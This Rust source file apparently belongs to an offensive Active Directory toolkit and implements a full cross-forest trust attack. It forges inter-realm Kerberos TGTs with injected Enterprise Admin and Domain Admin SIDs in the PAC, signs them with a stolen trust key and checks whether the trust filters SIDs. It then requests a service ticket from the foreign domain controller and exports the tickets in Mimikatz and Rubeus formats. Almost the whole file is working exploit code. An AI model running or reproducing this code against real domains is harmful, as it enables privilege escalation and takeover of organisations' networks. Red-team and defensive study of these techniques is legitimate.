//! Cross-forest trust abuse: SID History injection + Inter-realm TGT forging
//!
//! Attack chain:
//!   1. Enumerate trust relationships (foreign.rs)
//!   2. Extract inter-realm trust key (via DCSync of krbtgt/FOREIGN.DOMAIN)
//!   3. Forge inter-realm TGT with ExtraSids in PAC
//!   4. Present forged referral to foreign DC → full cross-forest access

use crate::crypto::{self, EncryptionType, KerberosKey};
use crate::error::{OverthroneError, Result};
use crate::proto::kerberos::constants::{
    AD_IF_RELEVANT, AD_WIN2K_PAC, KERB_TICKET_FLAGS_FORWARDABLE, KERB_TICKET_FLAGS_INITIAL,
    KERB_TICKET_FLAGS_RENEWABLE, NT_PRINCIPAL,
};
use crate::proto::kerberos::pa_data::PaData;
use crate::proto::kerberos::ticket::{EncTicketPart, KrbTicket, TransitedEncoding};
use crate::types::{DomainInfo, Sid, TrustDirection, TrustType};
use std::time::{Duration, SystemTime, UNIX_EPOCH};

// ──────────────────────────────────────────────────────────
// SID History structures (MS-PAC §2.6.3 KERB_SID_AND_ATTRIBUTES)
// ──────────────────────────────────────────────────────────

/// Single SID + attributes entry for the ExtraSids PAC field
#[derive(Debug, Clone)]
pub struct SidHistoryEntry {
    pub sid: Sid,
    pub attributes: u32,
}

/// SE_GROUP attribute flags (MS-PAC §2.2.1)
pub const SE_GROUP_MANDATORY: u32 = 0x0000_0001;
pub const SE_GROUP_ENABLED_BY_DEFAULT: u32 = 0x0000_0002;
pub const SE_GROUP_ENABLED: u32 = 0x0000_0004;
pub const SE_GROUP_USE_FOR_DENY_ONLY: u32 = 0x0000_0010;

impl SidHistoryEntry {
    /// Create an enabled mandatory SID entry (the common abuse case)
    pub fn enabled(sid: Sid) -> Self {
        Self {
            sid,
            attributes: SE_GROUP_MANDATORY | SE_GROUP_ENABLED_BY_DEFAULT | SE_GROUP_ENABLED,
        }
    }

    /// Encode into NDR-style bytes for PAC embedding
    pub fn to_ndr_bytes(&self) -> Vec<u8> {
        let mut buf = Vec::with_capacity(32);
        let sid_bytes = self.sid.to_bytes();
        // Pointer (non-null referent)
        buf.extend_from_slice(&1u32.to_le_bytes());
        // Attributes
        buf.extend_from_slice(&self.attributes.to_le_bytes());
        // SID length + data (conformant array in NDR)
        let sub_authority_count = self.sid.sub_authorities.len() as u32;
        buf.extend_from_slice(&sub_authority_count.to_le_bytes());
        buf.extend_from_slice(&sid_bytes);
        buf
    }
}

// ──────────────────────────────────────────────────────────
// ExtraSids PAC buffer (MS-PAC §2.6.3)
// ──────────────────────────────────────────────────────────

/// PAC_CLIENT_INFO extension: KERB_VALIDATION_INFO.ExtraSids
#[derive(Debug, Clone)]
pub struct ExtraSids {
    pub entries: Vec<SidHistoryEntry>,
}

impl ExtraSids {
    pub fn new() -> Self {
        Self {
            entries: Vec::new(),
        }
    }

    /// Add Enterprise Admins SID from target forest (the "money shot")
    /// Enterprise Admins RID = 519
    pub fn add_enterprise_admin(&mut self, target_domain_sid: &Sid) {
        let ea_sid = target_domain_sid.with_rid(519);
        self.entries.push(SidHistoryEntry::enabled(ea_sid));
    }

    /// Add Domain Admins from target forest (RID 512)
    pub fn add_domain_admin(&mut self, target_domain_sid: &Sid) {
        let da_sid = target_domain_sid.with_rid(512);
        self.entries.push(SidHistoryEntry::enabled(da_sid));
    }

    /// Add Schema Admins from target forest (RID 518)
    pub fn add_schema_admin(&mut self, target_domain_sid: &Sid) {
        let sa_sid = target_domain_sid.with_rid(518);
        self.entries.push(SidHistoryEntry::enabled(sa_sid));
    }

    /// Add an arbitrary SID (custom group, well-known SID, etc.)
    pub fn add_custom(&mut self, sid: Sid) {
        self.entries.push(SidHistoryEntry::enabled(sid));
    }

    /// Serialize the ExtraSids array for PAC KERB_VALIDATION_INFO
    pub fn to_pac_buffer(&self) -> Vec<u8> {
        let mut buf = Vec::new();
        // SidCount (ULONG)
        let count = self.entries.len() as u32;
        buf.extend_from_slice(&count.to_le_bytes());
        // ExtraSids pointer (non-null when count > 0)
        if count > 0 {
            buf.extend_from_slice(&1u32.to_le_bytes());
        } else {
            buf.extend_from_slice(&0u32.to_le_bytes());
        }
        // Max count (conformant array header)
        buf.extend_from_slice(&count.to_le_bytes());
        // Each KERB_SID_AND_ATTRIBUTES
        for entry in &self.entries {
            buf.extend(&entry.to_ndr_bytes());
        }
        buf
    }
}

// ──────────────────────────────────────────────────────────
// Inter-realm TGT forging
// ──────────────────────────────────────────────────────────

/// Configuration for cross-forest ticket forging
#[derive(Debug, Clone)]
pub struct InterRealmForgeConfig {
    /// Source domain (compromised forest)
    pub source_domain: String,
    /// Source domain SID
    pub source_domain_sid: Sid,
    /// Target (foreign) domain FQDN
    pub target_domain: String,
    /// Target domain SID (for ExtraSids)
    pub target_domain_sid: Sid,
    /// Inter-realm trust key (krbtgt/TARGET @ SOURCE)
    pub trust_key: KerberosKey,
    /// Encryption type for the forged ticket
    pub etype: EncryptionType,
    /// Username to impersonate
    pub impersonate_user: String,
    /// User RID in source domain
    pub user_rid: u32,
    /// Primary group RID (usually 513 = Domain Users)
    pub primary_group_rid: u32,
    /// Extra SIDs to inject (SID History)
    pub extra_sids: ExtraSids,
    /// Ticket lifetime
    pub lifetime: Duration,
    /// Whether SID filtering is suspected (adjusts strategy)
    pub sid_filtering_expected: bool,
}

impl InterRealmForgeConfig {
    /// Quick config for the classic Enterprise Admin cross-forest attack
    pub fn enterprise_admin_attack(
        source_domain: &str,
        source_domain_sid: Sid,
        target_domain: &str,
        target_domain_sid: Sid,
        trust_key: KerberosKey,
        etype: EncryptionType,
        impersonate_user: &str,
    ) -> Self {
        let mut extra_sids = ExtraSids::new();
        extra_sids.add_enterprise_admin(&target_domain_sid);

        Self {
            source_domain: source_domain.to_uppercase(),
            source_domain_sid,
            target_domain: target_domain.to_uppercase(),
            target_domain_sid,
            trust_key,
            etype,
            impersonate_user: impersonate_user.to_string(),
            user_rid: 1103, // default low-priv user
            primary_group_rid: 513,
            extra_sids,
            lifetime: Duration::from_secs(10 * 60 * 60), // 10 hours
            sid_filtering_expected: false,
        }
    }
}

/// Forged inter-realm referral TGT
#[derive(Debug)]
pub struct ForgedInterRealmTgt {
    /// The raw Kerberos ticket bytes (ASN.1 DER)
    pub ticket_bytes: Vec<u8>,
    /// The session key (for subsequent TGS-REQ to foreign KDC)
    pub session_key: Vec<u8>,
    /// Service principal: krbtgt/TARGET.DOMAIN @ SOURCE.DOMAIN
    pub service_principal: String,
    /// Client principal
    pub client_principal: String,
    /// Kirbi-format (.kirbi) for Rubeus/Mimikatz interop
    pub kirbi: Vec<u8>,
    /// ccache-format for Linux tooling interop
    pub ccache: Vec<u8>,
}

/// Forge an inter-realm TGT with SID History ExtraSids
///
/// This is the Rust equivalent of Mimikatz's:
///   kerberos::golden /user:X /domain:SRC /sid:S-1-5-21-... /krbtgt:<hash>
///       /sids:S-1-5-21-<target>-519 /service:krbtgt /target:TARGET.DOMAIN
pub fn forge_inter_realm_tgt(config: &InterRealmForgeConfig) -> Result<ForgedInterRealmTgt> {
    log::info!(
        "[interrealm] Forging inter-realm TGT: {} -> {} as '{}'",
        config.source_domain,
        config.target_domain,
        config.impersonate_user
    );

    // ── 1. Generate random session key ──
    let session_key = crypto::random_session_key(config.etype)?;

    // ── 2. Build the PAC ──
    let now = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .map_err(|e| OverthroneError::Internal(format!("time error: {e}")))?;
    let auth_time = now;
    let end_time = now + config.lifetime;
    let renew_till = now + Duration::from_secs(7 * 24 * 3600); // 7 days

    let pac = build_cross_forest_pac(
        &config.impersonate_user,
        &config.source_domain,
        &config.source_domain_sid,
        config.user_rid,
        config.primary_group_rid,
        &config.extra_sids,
        auth_time,
        &config.trust_key,
    )?;

    // ── 3. Build EncTicketPart ──
    let sname = format!("krbtgt/{}", config.target_domain);

    let enc_ticket = EncTicketPart {
        flags: KERB_TICKET_FLAGS_FORWARDABLE
            | KERB_TICKET_FLAGS_RENEWABLE
            | KERB_TICKET_FLAGS_INITIAL,
        session_key: session_key.clone(),
        crealm: config.source_domain.clone(),
        cname_type: NT_PRINCIPAL,
        cname: config.impersonate_user.clone(),
        transited: TransitedEncoding {
            tr_type: 1,           // DOMAIN-X500-COMPRESS
            contents: Vec::new(), // empty for direct trust
        },
        auth_time: filetime_from_duration(auth_time),
        start_time: Some(filetime_from_duration(auth_time)),
        end_time: filetime_from_duration(end_time),
        renew_till: Some(filetime_from_duration(renew_till)),
        authorization_data: vec![AuthDataEntry {
            ad_type: AD_IF_RELEVANT,
            ad_data: wrap_ad_if_relevant(AD_WIN2K_PAC, &pac),
        }],
    };

    // ── 4. Encrypt with inter-realm trust key ──
    let enc_ticket_bytes = enc_ticket.to_der()?;
    let encrypted = crypto::encrypt(
        config.etype,
        &config.trust_key,
        2, // key usage: TGS-REP ticket (KU 2)
        &enc_ticket_bytes,
    )?;

    // ── 5. Build outer Ticket structure ──
    let ticket = KrbTicket {
        tkt_vno: 5,
        realm: config.source_domain.clone(),
        sname_type: NT_PRINCIPAL,
        sname: sname.clone(),
        enc_part_etype: config.etype as i32,
        enc_part_kvno: Some(2),
        enc_part_cipher: encrypted,
    };

    let ticket_bytes = ticket.to_der()?;

    // ── 6. Export formats ──
    let kirbi = export_kirbi(
        &ticket,
        &session_key,
        &config.impersonate_user,
        &config.source_domain,
        &sname,
        config.etype,
        auth_time,
        end_time,
        renew_till,
    )?;

    let ccache = export_ccache(
        &ticket,
        &session_key,
        &config.impersonate_user,
        &config.source_domain,
        &sname,
        config.etype,
        auth_time,
        end_time,
    )?;

    log::info!(
        "[interrealm] Forged inter-realm TGT for {}/{} → {} ({} extra SIDs injected)",
        config.source_domain,
        config.impersonate_user,
        config.target_domain,
        config.extra_sids.entries.len()
    );

    if !config.extra_sids.entries.is_empty() {
        for entry in &config.extra_sids.entries {
            log::info!(
                "  └─ ExtraSid: {} (attrs: 0x{:08x})",
                entry.sid,
                entry.attributes
            );
        }
    }

    Ok(ForgedInterRealmTgt {
        ticket_bytes,
        session_key,
        service_principal: sname,
        client_principal: format!("{}@{}", config.impersonate_user, config.source_domain),
        kirbi,
        ccache,
    })
}

// ──────────────────────────────────────────────────────────
// PAC construction with ExtraSids
// ──────────────────────────────────────────────────────────

/// Build a PAC with KERB_VALIDATION_INFO containing ExtraSids for SID History abuse
fn build_cross_forest_pac(
    username: &str,
    domain: &str,
    domain_sid: &Sid,
    user_rid: u32,
    primary_group_rid: u32,
    extra_sids: &ExtraSids,
    auth_time: Duration,
    server_key: &KerberosKey,
) -> Result<Vec<u8>> {
    // KERB_VALIDATION_INFO (MS-PAC §2.5)
    let mut logon_info = Vec::with_capacity(512);

    // LogonTime (FILETIME)
    let ft = duration_to_filetime(auth_time);
    logon_info.extend_from_slice(&ft.to_le_bytes());

    // LogoffTime = MAX
    logon_info.extend_from_slice(&i64::MAX.to_le_bytes());

    // KickOffTime = MAX
    logon_info.extend_from_slice(&i64::MAX.to_le_bytes());

    // PasswordLastSet = LogonTime
    logon_info.extend_from_slice(&ft.to_le_bytes());

    // PasswordCanChange = 0
    logon_info.extend_from_slice(&0i64.to_le_bytes());

    // PasswordMustChange = MAX
    logon_info.extend_from_slice(&i64::MAX.to_le_bytes());

    // EffectiveName (RPC_UNICODE_STRING)
    append_rpc_unicode_string(&mut logon_info, username);

    // FullName
    append_rpc_unicode_string(&mut logon_info, username);

    // LogonScript (empty)
    append_rpc_unicode_string(&mut logon_info, "");

    // ProfilePath (empty)
    append_rpc_unicode_string(&mut logon_info, "");

    // HomeDirectory (empty)
    append_rpc_unicode_string(&mut logon_info, "");

    // HomeDirectoryDrive (empty)
    append_rpc_unicode_string(&mut logon_info, "");

    // LogonCount
    logon_info.extend_from_slice(&0u16.to_le_bytes());

    // BadPasswordCount
    logon_info.extend_from_slice(&0u16.to_le_bytes());

    // UserId
    logon_info.extend_from_slice(&user_rid.to_le_bytes());

    // PrimaryGroupId
    logon_info.extend_from_slice(&primary_group_rid.to_le_bytes());

    // GroupCount = 1 (Domain Users)
    logon_info.extend_from_slice(&1u32.to_le_bytes());

    // GroupIds pointer (non-null)
    logon_info.extend_from_slice(&1u32.to_le_bytes());

    // UserFlags: LOGON_EXTRA_SIDS (0x0020) when ExtraSids present
    let user_flags: u32 = if !extra_sids.entries.is_empty() {
        0x0020
    } else {
        0
    };
    logon_info.extend_from_slice(&user_flags.to_le_bytes());

    // UserSessionKey (16 zero bytes)
    logon_info.extend_from_slice(&[0u8; 16]);

    // LogonServer
    append_rpc_unicode_string(&mut logon_info, "DC01");

    // LogonDomainName
    append_rpc_unicode_string(&mut logon_info, domain);

    // LogonDomainId (pointer, non-null)
    logon_info.extend_from_slice(&1u32.to_le_bytes());

    // Reserved1 (2x ULONG)
    logon_info.extend_from_slice(&[0u8; 8]);

    // UserAccountControl: NORMAL_ACCOUNT (0x0010)
    logon_info.extend_from_slice(&0x0010u32.to_le_bytes());

    // SubAuthStatus, LastSuccessfulILogon, etc. (padding)
    logon_info.extend_from_slice(&[0u8; 28]);

    // ── ExtraSids (the payload) ──
    let extra_sids_buf = extra_sids.to_pac_buffer();
    logon_info.extend(&extra_sids_buf);

    // ResourceGroupDomainSid = NULL, ResourceGroupCount = 0
    logon_info.extend_from_slice(&0u32.to_le_bytes()); // pointer = null
    logon_info.extend_from_slice(&0u32.to_le_bytes()); // count = 0

    // ── Deferred data: GroupIds array ──
    // Max count
    logon_info.extend_from_slice(&1u32.to_le_bytes());
    // GROUP_MEMBERSHIP: RID + attributes
    logon_info.extend_from_slice(&primary_group_rid.to_le_bytes());
    logon_info.extend_from_slice(
        &(SE_GROUP_MANDATORY | SE_GROUP_ENABLED_BY_DEFAULT | SE_GROUP_ENABLED).to_le_bytes(),
    );

    // ── Deferred data: LogonDomainId SID ──
    let sid_bytes = domain_sid.to_bytes();
    logon_info.extend_from_slice(&(domain_sid.sub_authorities.len() as u32).to_le_bytes());
    logon_info.extend(&sid_bytes);

    // ── Build PAC_INFO_BUFFER array ──
    // We need: LOGON_INFO (type 1), SERVER_CHECKSUM (type 6), PRIVSVR_CHECKSUM (type 7)
    let pac_buffers_count = 3u32;
    let mut pac = Vec::with_capacity(1024);

    // PACTYPE header
    pac.extend_from_slice(&pac_buffers_count.to_le_bytes()); // cBuffers
    pac.extend_from_slice(&0u32.to_le_bytes()); // Version = 0

    // Calculate offsets (header = 8, each PAC_INFO_BUFFER = 16)
    let header_size = 8 + (pac_buffers_count as usize * 16);
    let logon_info_offset = align8(header_size);
    let logon_info_size = logon_info.len();

    let server_cksum_offset = align8(logon_info_offset + logon_info_size);
    let server_cksum_size = 4 + checksum_size(server_key); // type(4) + checksum

    let privsvr_cksum_offset = align8(server_cksum_offset + server_cksum_size);
    let privsvr_cksum_size = server_cksum_size; // same structure

    // PAC_INFO_BUFFER[0]: LOGON_INFORMATION (type 1)
    pac.extend_from_slice(&1u32.to_le_bytes());
    pac.extend_from_slice(&(logon_info_size as u32).to_le_bytes());
    pac.extend_from_slice(&(logon_info_offset as u64).to_le_bytes());

    // PAC_INFO_BUFFER[1]: SERVER_CHECKSUM (type 6)
    pac.extend_from_slice(&6u32.to_le_bytes());
    pac.extend_from_slice(&(server_cksum_size as u32).to_le_bytes());
    pac.extend_from_slice(&(server_cksum_offset as u64).to_le_bytes());

    // PAC_INFO_BUFFER[2]: PRIVSVR_CHECKSUM (type 7)
    pac.extend_from_slice(&7u32.to_le_bytes());
    pac.extend_from_slice(&(privsvr_cksum_size as u32).to_le_bytes());
    pac.extend_from_slice(&(privsvr_cksum_offset as u64).to_le_bytes());

    // Pad to logon_info_offset
    pac.resize(logon_info_offset, 0);
    pac.extend(&logon_info);

    // Pad to server_cksum_offset
    pac.resize(server_cksum_offset, 0);

    // Server checksum placeholder (zeroed, computed below)
    let server_cksum_type = crypto::pac_checksum_type(server_key);
    pac.extend_from_slice(&server_cksum_type.to_le_bytes());
    let cksum_len = checksum_size(server_key);
    let server_cksum_pos = pac.len();
    pac.extend(vec![0u8; cksum_len]);

    // Pad to privsvr_cksum_offset
    pac.resize(privsvr_cksum_offset, 0);

    // KDC checksum placeholder
    pac.extend_from_slice(&server_cksum_type.to_le_bytes());
    let privsvr_cksum_pos = pac.len();
    pac.extend(vec![0u8; cksum_len]);

    // ── Compute checksums ──
    // Server checksum = HMAC over entire PAC (with server checksum zeroed)
    let server_cksum = crypto::pac_checksum(server_key, &pac)?;
    pac[server_cksum_pos..server_cksum_pos + cksum_len].copy_from_slice(&server_cksum);

    // KDC/PrivSvr checksum = HMAC over server checksum
    let privsvr_cksum = crypto::pac_checksum(server_key, &server_cksum)?;
    pac[privsvr_cksum_pos..privsvr_cksum_pos + cksum_len].copy_from_slice(&privsvr_cksum);

    Ok(pac)
}

// ──────────────────────────────────────────────────────────
// SID History full attack orchestrator
// ──────────────────────────────────────────────────────────

/// Complete cross-forest attack: enumerate → forge → use
pub struct CrossForestAttack {
    config: InterRealmForgeConfig,
}

impl CrossForestAttack {
    pub fn new(config: InterRealmForgeConfig) -> Self {
        Self { config }
    }

    /// Execute the full cross-forest escalation chain
    pub async fn execute(&self) -> Result<CrossForestResult> {
        log::info!(
            "[cross-forest] Starting attack: {} → {}",
            self.config.source_domain,
            self.config.target_domain
        );

        // Step 1: Check SID filtering status
        let sid_filtering =
            check_sid_filtering_status(&self.config.source_domain, &self.config.target_domain)
                .await?;

        if sid_filtering.quarantine_enabled && !self.config.sid_filtering_expected {
            log::warn!(
                "[cross-forest] ⚠ SID filtering (quarantine) is ENABLED on {} → {} trust!",
                self.config.source_domain,
                self.config.target_domain
            );
            log::warn!(
                "[cross-forest] ExtraSids with foreign domain SIDs will be stripped by target DC"
            );
            log::warn!(
                "[cross-forest] Consider: TGT delegation abuse, RBCD across trust, or ADCS ESC8 relay"
            );
        }

        // Step 2: Forge the inter-realm TGT
        let forged_tgt = forge_inter_realm_tgt(&self.config)?;

        // Step 3: Use the forged TGT to request service ticket in foreign domain
        let service_ticket = if !sid_filtering.quarantine_enabled {
            log::info!(
                "[cross-forest] SID filtering DISABLED — requesting CIFS ticket in target forest"
            );
            Some(
                request_foreign_service_ticket(
                    &forged_tgt,
                    &self.config.target_domain,
                    &format!("cifs/dc01.{}", self.config.target_domain.to_lowercase()),
                )
                .await?,
            )
        } else {
            log::info!(
                "[cross-forest] SID filtering enabled — skipping direct service ticket request"
            );
            None
        };

        Ok(CrossForestResult {
            forged_tgt,
            service_ticket,
            sid_filtering,
            attack_path: format!(
                "{}/{} --[inter-realm TGT + SID History]--> EA@{}",
                self.config.source_domain, self.config.impersonate_user, self.config.target_domain,
            ),
        })
    }
}

#[derive(Debug)]
pub struct CrossForestResult {
    pub forged_tgt: ForgedInterRealmTgt,
    pub service_ticket: Option<Vec<u8>>,
    pub sid_filtering: SidFilteringStatus,
    pub attack_path: String,
}

#[derive(Debug)]
pub struct SidFilteringStatus {
    pub quarantine_enabled: bool,
    pub selective_auth: bool,
    pub trust_attributes: u32,
    pub trust_direction: TrustDirection,
}

/// Check if SID filtering / quarantine is enabled on the trust
/// Reads trustAttributes from the TDO (Trusted Domain Object) via LDAP
async fn check_sid_filtering_status(
    source_domain: &str,
    target_domain: &str,
) -> Result<SidFilteringStatus> {
    // TRUST_ATTRIBUTE flags (MS-ADTS §6.1.6.7.9)
    const TRUST_ATTRIBUTE_QUARANTINED_DOMAIN: u32 = 0x0000_0004;
    const TRUST_ATTRIBUTE_FOREST_TRANSITIVE: u32 = 0x0000_0008;
    const TRUST_ATTRIBUTE_CROSS_ORGANIZATION: u32 = 0x0000_0010;
    const TRUST_ATTRIBUTE_TREAT_AS_EXTERNAL: u32 = 0x0000_0040;

    // Query LDAP for the TDO
    let search_base = domain_to_dn(source_domain);
    let filter = format!(
        "(&(objectClass=trustedDomain)(cn={}))",
        target_domain.split('.').next().unwrap_or(target_domain)
    );

    log::debug!(
        "[cross-forest] Querying TDO: base={}, filter={}",
        search_base,
        filter
    );

    // Use the existing LDAP client from the crawler context
    let tdo_attrs = crate::proto::ldap::search_first(
        &search_base,
        &filter,
        &[
            "trustAttributes",
            "trustDirection",
            "trustType",
            "securityIdentifier",
        ],
    )
    .await?;

    let trust_attrs = tdo_attrs.get_u32("trustAttributes").unwrap_or(0);

    let trust_dir = tdo_attrs.get_u32("trustDirection").unwrap_or(0);

    let quarantine = (trust_attrs & TRUST_ATTRIBUTE_QUARANTINED_DOMAIN) != 0;
    let selective_auth = (trust_attrs & TRUST_ATTRIBUTE_CROSS_ORGANIZATION) != 0;

    // For forest trusts, SID filtering is ON by default unless TREAT_AS_EXTERNAL is set
    let is_forest = (trust_attrs & TRUST_ATTRIBUTE_FOREST_TRANSITIVE) != 0;
    let treat_as_external = (trust_attrs & TRUST_ATTRIBUTE_TREAT_AS_EXTERNAL) != 0;

    let effective_filtering = if is_forest {
        // Forest trusts filter SIDs by default (only same-forest SIDs pass)
        // unless quarantine is explicitly set or the trust is "treat as external"
        !treat_as_external
    } else {
        quarantine
    };

    let status = SidFilteringStatus {
        quarantine_enabled: effective_filtering,
        selective_auth,
        trust_attributes: trust_attrs,
        trust_direction: TrustDirection::from_u32(trust_dir),
    };

    log::info!(
        "[cross-forest] Trust {} → {}: filtering={}, selective_auth={}, attrs=0x{:08x}",
        source_domain,
        target_domain,
        status.quarantine_enabled,
        status.selective_auth,
        trust_attrs
    );

    Ok(status)
}

/// Request a service ticket from foreign DC using our forged inter-realm TGT
async fn request_foreign_service_ticket(
    tgt: &ForgedInterRealmTgt,
    target_domain: &str,
    service_spn: &str,
) -> Result<Vec<u8>> {
    use crate::proto::kerberos::client::KrbClient;

    log::info!(
        "[cross-forest] TGS-REQ to {} for SPN: {}",
        target_domain,
        service_spn
    );

    let mut client = KrbClient::connect_to_domain(target_domain).await?;

    let tgs_rep = client
        .tgs_req_with_ticket(&tgt.ticket_bytes, &tgt.session_key, service_spn)
        .await?;

    log::info!(
        "[cross-forest] ✓ Got service ticket for {} (size={})",
        service_spn,
        tgs_rep.len()
    );

    Ok(tgs_rep)
}

// ──────────────────────────────────────────────────────────
// Helpers
// ──────────────────────────────────────────────────────────

#[derive(Debug)]
struct AuthDataEntry {
    ad_type: i32,
    ad_data: Vec<u8>,
}

fn wrap_ad_if_relevant(inner_type: i32, data: &[u8]) -> Vec<u8> {
    // AD-IF-RELEVANT is a SEQUENCE OF AuthorizationData
    let mut buf = Vec::new();
    // Inner AuthorizationData element
    buf.extend_from_slice(&(inner_type as u32).to_le_bytes());
    buf.extend_from_slice(&(data.len() as u32).to_le_bytes());
    buf.extend_from_slice(data);
    buf
}

fn append_rpc_unicode_string(buf: &mut Vec<u8>, s: &str) {
    let utf16: Vec<u16> = s.encode_utf16().collect();
    let byte_len = (utf16.len() * 2) as u16;
    // Length (bytes)
    buf.extend_from_slice(&byte_len.to_le_bytes());
    // MaximumLength
    buf.extend_from_slice(&byte_len.to_le_bytes());
    // Pointer (non-null if non-empty)
    if utf16.is_empty() {
        buf.extend_from_slice(&0u32.to_le_bytes());
    } else {
        buf.extend_from_slice(&1u32.to_le_bytes());
    }
}

fn domain_to_dn(domain: &str) -> String {
    domain
        .split('.')
        .map(|p| format!("DC={}", p))
        .collect::<Vec<_>>()
        .join(",")
}

fn align8(n: usize) -> usize {
    (n + 7) & !7
}

fn duration_to_filetime(d: Duration) -> i64 {
    // Windows FILETIME = 100ns intervals since 1601-01-01
    const EPOCH_DIFF: i64 = 116_444_736_000_000_000;
    let nanos_100 = d.as_nanos() as i64 / 100;
    nanos_100 + EPOCH_DIFF
}

fn filetime_from_duration(d: Duration) -> i64 {
    duration_to_filetime(d)
}

fn checksum_size(key: &KerberosKey) -> usize {
    match key.etype() {
        EncryptionType::Rc4Hmac => 16,       // MD5-based HMAC
        EncryptionType::Aes128CtsHmac => 12, // truncated SHA-1
        EncryptionType::Aes256CtsHmac => 12,
        _ => 16,
    }
}

fn export_kirbi(
    ticket: &KrbTicket,
    session_key: &[u8],
    client: &str,
    realm: &str,
    service: &str,
    etype: EncryptionType,
    auth_time: Duration,
    end_time: Duration,
    renew_till: Duration,
) -> Result<Vec<u8>> {
    // KRB-CRED structure (RFC 4120 §5.8.1) — .kirbi format
    crate::proto::kerberos::export::to_kirbi(
        ticket,
        session_key,
        client,
        realm,
        service,
        etype,
        auth_time,
        end_time,
        renew_till,
    )
}

fn export_ccache(
    ticket: &KrbTicket,
    session_key: &[u8],
    client: &str,
    realm: &str,
    service: &str,
    etype: EncryptionType,
    auth_time: Duration,
    end_time: Duration,
) -> Result<Vec<u8>> {
    // MIT ccache format for Linux interop
    crate::proto::kerberos::export::to_ccache(
        ticket,
        session_key,
        client,
        realm,
        service,
        etype,
        auth_time,
        end_time,
    )
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_extra_sids_encoding() {
        let target_sid = Sid::from_str("S-1-5-21-1234567890-9876543210-1111111111").unwrap();
        let mut extra = ExtraSids::new();
        extra.add_enterprise_admin(&target_sid);
        extra.add_domain_admin(&target_sid);

        let buf = extra.to_pac_buffer();
        // SidCount = 2
        assert_eq!(u32::from_le_bytes(buf[0..4].try_into().unwrap()), 2);
        // ExtraSids pointer != 0
        assert_ne!(u32::from_le_bytes(buf[4..8].try_into().unwrap()), 0);
    }

    #[test]
    fn test_sid_history_entry() {
        let sid = Sid::from_str("S-1-5-21-1234567890-9876543210-1111111111-519").unwrap();
        let entry = SidHistoryEntry::enabled(sid.clone());
        assert_eq!(
            entry.attributes,
            SE_GROUP_MANDATORY | SE_GROUP_ENABLED_BY_DEFAULT | SE_GROUP_ENABLED
        );
        let bytes = entry.to_ndr_bytes();
        assert!(!bytes.is_empty());
    }

    #[test]
    fn test_domain_to_dn() {
        assert_eq!(domain_to_dn("CORP.LOCAL"), "DC=CORP,DC=LOCAL");
        assert_eq!(
            domain_to_dn("child.corp.local"),
            "DC=child,DC=corp,DC=local"
        );
    }
}
